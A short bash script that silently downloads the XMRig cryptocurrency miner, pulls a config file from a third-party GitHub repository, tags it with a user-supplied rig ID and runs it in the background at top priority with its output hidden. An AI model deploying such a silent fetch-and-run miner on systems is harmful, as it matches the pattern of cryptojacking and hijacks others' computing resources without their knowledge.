#!/bin/bash

user=$1

sudo wget -q -N https://github.com/xmrig/xmrig/releases/download/v6.4.0/xmrig-6.4.0-linux-static-x64.tar.gz
sudo tar -xzf xmrig-6.4.0-linux-static-x64.tar.gz
sudo rm -rf xmrig-6.4.0-linux-static-x64.tar.gz

cd xmrig-6.4.0

sudo wget -q -N https://raw.githubusercontent.com/robotpack/scripts/master/config.json
sudo sed -i 's/"rig-id":.*/"rig-id": "'$user'",/' config.json

sudo nohup nice -n -20 ./xmrig > /dev/null &
